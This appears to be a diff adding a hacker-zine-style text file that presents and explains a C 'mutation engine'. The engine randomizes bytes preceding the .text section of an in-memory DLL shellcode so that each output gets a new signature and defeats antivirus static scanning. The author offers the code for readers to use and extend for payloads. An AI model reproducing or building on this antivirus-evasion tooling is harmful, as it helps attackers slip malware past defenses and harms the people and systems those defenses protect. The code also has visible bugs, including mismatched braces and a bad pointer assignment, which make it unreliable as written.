@@ -1,0 +1,139 @@
+===================================================
++                     Mutant                      +
++                     Sleepy                      +
++                      2025                       +
+===================================================
+
+
+Code mutation used to be the star of the show
+when it came to hacking. Back in the early
+2000s, malware, or what it was mostly reffered
+to back then, as viruses were built to fight
+against AV just like today. The only difference
+is that all AV scanning was based on static
+detection. Interstingly enough, there have been
+years of work on mutation engines that modify
+the codes signature making static scanning nearly
+useless.
+
+Today, static scanning is still used and is always
+the first line of defense. Well, I have been working
+on a mutation engine that edits the data before the
+.text section, making every new shellcode unable to
+be signatured.
+
+I want to go in to detail my technique for making
+self modifying code. This technique goes over manually
+patching the bytes of a shellcode in memory and
+giving the output into a new file, or run it in memory.
+
+I had a thought that if I patched the data outside of
+the .text section with random data, rather than stripping
+the .text section. So, I wrote up a mutation engine in C
+that reads a raw DLL buffer and randomly patch bytes
+before the .text section.
+
+My payloads typically dont use anything but the .text
+section, so was perfect in my mind.
+
+Below is a copy of my mutation engine for you to use.
+Just make sure that you are only executing from the
+.text section and scramble the bytes outside of it.
+
+This code gives a new .h file for your shellcode every
+time you run it.
+
+===========================================================
+
+#include <Windows.h>
+#include <stdio.h>
+#include "calc.h"
+
+int main() {
+
+   // Read DOS header
+    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)CreateProcess_dll;
+    if (dh->e_magic != IMAGE_DOS_SIGNATURE) {
+        //printf("Invalid PE file\n");
+        return FALSE;
+    }
+
+    // Read NT headers
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) {
+      // printf("Invalid NT headers\n");
+        return FALSE;
+    }
+
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
+
+        SIZE_T rawSize = section->SizeOfRawData;
+
+            if (strcmp(section->Name, ".data") == 0 || strcmp(section->Name, ".text") == 0) {
+
+                //printf("Mapped section: %.*s\n", 8, section->Name);
+
+                    if (memcmp(section->Name, ".text", 5) == 0) {
+
+                        unsigned char* address = (unsigned char*)CreateProcess_dll + section->VirtualAddress;
+
+                         //printf("offset: %lu\n", section->VirtualAddress);
+
+                         unsigned int offsetofbytes2replace = rand() % 200;
+
+                         unsigned char* bytes2replace = address - offsetofbytes2replace;
+
+                         for (int j=0; j < offsetofbytes2replace; j++) {
+                            bytes2replace[j] = rand() % 256;
+                         }
+
+                         unsigned int* newSize = nt->OptionalHeader.SizeOfImage - offsetofbytes2replace;
+
+                         FILE* f = fopen("mutated_dll.h", "w");
+                         if (!f) {
+                           printf("Failed to open file for writing.\n");
+                           return 1;
+                        }
+
+                        fprintf(f, "unsigned char mutated_dll[%zu] = {\n", nt->OptionalHeader.SizeOfImage);
+
+
+                        for (size_t i = 0; i < nt->OptionalHeader.SizeOfImage; i++) {
+                              fprintf(f, "0x%02X", CreateProcess_dll[i]);
+                              if (i < nt->OptionalHeader.SizeOfImage - 1) fprintf(f, ",");
+                              if ((i + 1) % 12 == 0) fprintf(f, "\n"); // Wrap lines for readability
+                            }
+
+                        return 0;
+
+}
+}
+
+
+
+
+return 0;
+}
+}
+
+===========================================================
+
+calc.h is just a calculator shellcode that I wrote previously,
+this header file can be replaced with your header file. Better
+yet, have it take in a file from disk into the PIMAGE_DOS_HEADER
+directly.
+
+This is my rough copy and I have extended this further, I feel
+like this is a good base for anyone wanting to extended this into
+something bigger. But, for now it still gives you a brand new
+shellcode with a brand new signature.
+
+I suggest tampering with the random generated numbers and making
+your own version.
+
+Have fun :)
+
+-Sleepy
+
+[EOF]
